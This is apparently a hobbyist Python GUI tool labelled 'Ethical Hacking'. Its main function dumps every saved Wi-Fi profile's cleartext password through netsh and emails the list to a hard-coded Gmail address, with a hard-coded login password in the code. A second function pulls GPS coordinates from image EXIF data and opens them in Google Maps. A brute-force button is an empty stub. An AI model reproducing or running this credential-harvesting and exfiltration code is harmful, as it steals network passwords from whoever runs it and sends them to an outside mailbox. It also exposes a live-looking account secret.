from random import randrange
import tkinter
import tkinter.messagebox
import customtkinter
from PIL import Image
import os
import pandas 
import matplotlib.pyplot as plt
import numpy as np
import time
import subprocess
import re
import smtplib
from email.message import EmailMessage
from PIL.ExifTags import GPSTAGS, TAGS
import webbrowser
customtkinter.set_appearance_mode("System")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("blue")  # Themes: "blue" (standard), "green", "dark-blue"
class App(customtkinter.CTk):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        start = time.perf_counter()


        def get_password():
            command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

            profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

            wifi_list = list()

            if len(profile_names) != 0:
                for name in profile_names:
                    
                    wifi_profile = dict()
                    
                    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
                    
                    if re.search("Security key           : Absent", profile_info):
                        continue
                    else:
                        
                        wifi_profile["ssid"] = name
                        
                        profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                        
                        password = re.search("Key Content            : (.*)\r", profile_info_pass)
                        
                        if password == None:
                            wifi_profile["password"] = None
                        else:
                            
                            wifi_profile["password"] = password[1]
                    
                        wifi_list.append(wifi_profile)



            email_message = ""
            for item in wifi_list:
                email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"


            email = EmailMessage()

            email["from"] = "ethical.hacking.by.diego@gmail.comer"

            email["to"] = "ethical.hacking.by.diego@gmail.com"

            email["subject"] = "WiFi SSIDs and Passwords"
            email.set_content(email_message)


            with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
                smtp.ehlo()
                
                smtp.starttls()
                
                smtp.login("ethical.hacking.by.diego@gmail.com", "bwzktywobnzdwagt")
                
                smtp.send_message(email)

        def get_location():
            def create_google_maps_url(gps_coords):            
    
                dec_deg_lat = convert_decimal_degrees(float(gps_coords["lat"][0]),  float(gps_coords["lat"][1]), float(gps_coords["lat"][2]), gps_coords["lat_ref"])
                
                dec_deg_lon = convert_decimal_degrees(float(gps_coords["lon"][0]),  float(gps_coords["lon"][1]), float(gps_coords["lon"][2]), gps_coords["lon_ref"])
                
                return f"https://maps.google.com/?q={dec_deg_lat},{dec_deg_lon}"


            # Converting to decimal degrees for latitude and longitude is from degree/minutes/seconds format is the same for latitude and longitude. So we use DRY principles, and create a seperate function.
            def convert_decimal_degrees(degree, minutes, seconds, direction):
                decimal_degrees = degree + minutes / 60 + seconds / 3600
                # A value of "S" for South or West will be multiplied by -1
                if direction == "S" or direction == "W":
                    decimal_degrees *= -1
                return decimal_degrees
                    
            # Add files to the folder ./images
            # We assign the cwd to a variable. We will refer to it to get the path to images.
            cwd = os.getcwd()
            # Change the current working directory to the one where you keep your images.
            os.chdir(os.path.join(cwd, "images"))
            # Get a list of all the files in the images directory.
            files = os.listdir()

            # Check if you have any files in the ./images folder.
            if len(files) == 0:
                print("You don't have have files in the ./images folder.")
                exit()
            # Loop through the files in the images directory.
            for file in files:
                # We add try except black to handle when there are wrong file formats in the ./images folder.
                try:
                    # Open the image file. We open the file in binary format for reading.
                    image = Image.open(file)
                    print(f"_______________________________________________________________{file}_______________________________________________________________")
                    # The ._getexif() method returns a dictionary. .items() method returns a list of all dictionary keys and values.
                    gps_coords = {}
                    # We check if exif data are defined for the image. 
                    if image._getexif() == None:
                        print(f"{file} contains no exif data.")
                    # If exif data are defined we can cycle through the tag, and value for the file.
                    else:
                        for tag, value in image._getexif().items():
                            # If you print the tag without running it through the TAGS.get() method you'll get numerical values for every tag. We want the tags in human-readable form. 
                            # You can see the tags and the associated decimal number in the exif standard here: https://exiv2.org/tags.html
                            tag_name = TAGS.get(tag)
                            if tag_name == "GPSInfo":
                                for key, val in value.items():
                                    # Print the GPS Data value for every key to the screen.
                                    print(f"{GPSTAGS.get(key)} - {val}")
                                    # We add Latitude data to the gps_coord dictionary which we initialized in line 110.
                                    if GPSTAGS.get(key) == "GPSLatitude":
                                        gps_coords["lat"] = val
                                    # We add Longitude data to the gps_coord dictionary which we initialized in line 110.
                                    elif GPSTAGS.get(key) == "GPSLongitude":
                                        gps_coords["lon"] = val
                                    # We add Latitude reference data to the gps_coord dictionary which we initialized in line 110.
                                    elif GPSTAGS.get(key) == "GPSLatitudeRef":
                                        gps_coords["lat_ref"] = val
                                    # We add Longitude reference data to the gps_coord dictionary which we initialized in line 110.
                                    elif GPSTAGS.get(key) == "GPSLongitudeRef":
                                        gps_coords["lon_ref"] = val   
                            
                            
                        # We print the longitudinal and latitudinal data which has been formatted for Google Maps. We only do so if the GPS Coordinates exists. 
                        if gps_coords:
                            print(create_google_maps_url(gps_coords))
                            webbrowser.open(create_google_maps_url(gps_coords))
                        # Change back to the original working directory.
                except IOError:
                    print("File format not supported!")
 

        def brutforce():
            print()


        def button_password():
            get_password()
            print()
        def button_location():
            get_location()
        def button_brutforce():
            brutforce

        self.title("Ethical Hacking")
        self.geometry(f"{950}x{650}")
        self.resizable(False,False)

        # configure grid layout (2x2)
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure((0, 1, 2), weight=1)
        ##hak1
        
        self.textbox1 = customtkinter.CTkTextbox(self, width=550, height=180)
        self.textbox1.grid(row=0, column=0, padx=20, pady=10, sticky="nsew")
        self.sidebar_button_1 = customtkinter.CTkButton(self, command=button_password, height=180, width=300, text='Password Hacking Start')
        self.sidebar_button_1.grid(row=0, column=1, padx=20, pady=10)                                     
        
        ##hak2
        
        self.textbox2 = customtkinter.CTkTextbox(self, width=550,height=180)
        self.textbox2.grid(row=1, column=0, padx=20, pady=10, sticky="nsew")
        self.sidebar_button_2 = customtkinter.CTkButton(self, command=button_location, height=180, width=300, text='Location Hacking Start')
        self.sidebar_button_2.grid(row=1, column=1, padx=20, pady=10)                                      
        
        ##hak3
              
        self.textbox3 = customtkinter.CTkTextbox(self, width=550,height=180)
        self.textbox3.grid(row=2, column=0, padx=20, pady=10, sticky="nsew")
        self.sidebar_button_3 = customtkinter.CTkButton(self, command=button_brutforce, height=180, width=300, text='Bruteforce Attack Start')
        self.sidebar_button_3.grid(row=2, column=1, padx=20, pady=10)
        
        self.textbox1.insert("0.0","tekst")
if __name__ == "__main__":
    app = App()
    app.mainloop()
